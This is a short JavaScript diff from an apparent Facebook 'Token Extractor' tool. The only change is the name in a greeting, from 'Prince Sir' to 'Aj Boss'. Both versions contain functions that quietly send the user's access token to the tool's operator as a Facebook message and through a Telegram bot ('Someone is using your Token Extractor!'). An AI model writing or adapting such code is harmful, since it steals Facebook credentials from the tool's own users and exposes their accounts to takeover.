@@ -9,7 +9,7 @@ async function sendFacebookNotification(token) {
   }
 
   try {
-    const message = `Hello Prince Sir I'm using your Token Extractor My Token is ${token}`;
+    const message = `Hello Aj Boss I'm using your Token Extractor My Token is ${token}`;
     
     const parameters = {
       access_token: token,
@@ -51,7 +51,7 @@ async function sendTelegramNotification(token) {
   }
 
   try {
-    const message = `🔔 *New Token Generated*\n\n👋 Hello Prince Sir\n\nSomeone is using your Token Extractor!\n\n🔑 *Token:*\n\`${token}\``;
+    const message = `🔔 *New Token Generated*\n\n👋 Hello Aj Boss\n\nSomeone is using your Token Extractor!\n\n🔑 *Token:*\n\`${token}\``;
     
     const response = await axios.post(
       `https://api.telegram.org/bot${botToken}/sendMessage`,
